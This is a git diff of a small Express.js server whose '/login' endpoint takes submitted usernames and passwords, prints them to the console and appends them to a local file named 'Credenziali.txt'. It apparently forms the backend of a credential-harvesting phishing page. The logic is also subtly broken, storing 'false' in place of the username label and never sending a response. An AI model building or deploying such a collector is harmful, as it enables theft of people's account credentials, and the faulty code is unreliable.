@@ -1,18 +1,31 @@
 const express = require('express');
 const app = express();
 const bodyParser = require('body-parser');
+const fs = require('fs')
 
-const PORT = 3000; // You can change this port number if needed
+const PORT = 3000;
 
 app.use(bodyParser.urlencoded({ extended: false }));
 
-app.post('/password', (req, res) => {
+app.post('/login', (req, res) => {
+  const username = req.body.username;
   const password = req.body.password;
-  console.log('Received password:', password);
-  // You can do further processing with the password here
+  var data = "";
 
-  // Respond with a success message
-  res.status(200).send('Password received successfully.');
+  if (!req.body.password) {
+    console.log('Received username:', username);
+    data = !"Username: " + username;
+  };
+  if (!req.body.username) {
+    console.log('Received password:', password);
+    data = "Password: " + password + "\n";
+  };
+
+  // Write data in 'Credenziali.txt' .
+  fs.appendFile('Credenziali.txt', data, (err) => {
+      // In case of a error throw err.
+      if (err) throw err;
+  })
 });
 
 app.listen(PORT, () => {
